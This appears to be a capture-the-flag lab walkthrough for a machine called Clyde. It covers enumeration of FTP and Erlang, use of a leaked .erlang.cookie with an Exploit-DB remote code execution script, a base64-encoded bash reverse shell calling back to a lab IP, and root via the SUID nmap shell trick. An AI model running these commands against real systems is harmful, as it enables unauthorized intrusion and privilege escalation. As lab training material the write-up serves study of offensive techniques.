# Clyde

### Enumeration

```
4369/tcp  open   epmd       Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 65000
```

```
21/tcp    open   ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ...
| drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 rabbitmq
| ...
```

FTP - Anonymous Access

.erlang.cookie is in rabbitmq directory.

.erlang.cookie - \[REDACTED]

### Initial Access

Erlang Cookie - Remote Code Execution

[https://www.exploit-db.com/exploits/49418](https://www.exploit-db.com/exploits/49418)

```
$ python3 49418
...
TARGET = "192.168.94.68"
PORT = 65000
COOKIE = [REDACTED]
CMD = "id"
...
```

```
/bin/bash -i >& /dev/tcp/192.168.49.94/80 0>&1 - Base64 encoded

#Send these commands one by one
CMD = "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDkuOTQvODAgMD4mMQ== | base64 -d > shell.sh"
CMD = "bash shell"
```

### PrivEsc

```
rabbitmq@clyde:/$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/nmap
...
```

[https://gtfobins.github.io/gtfobins/nmap/#shell](https://gtfobins.github.io/gtfobins/nmap/#shell)

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```
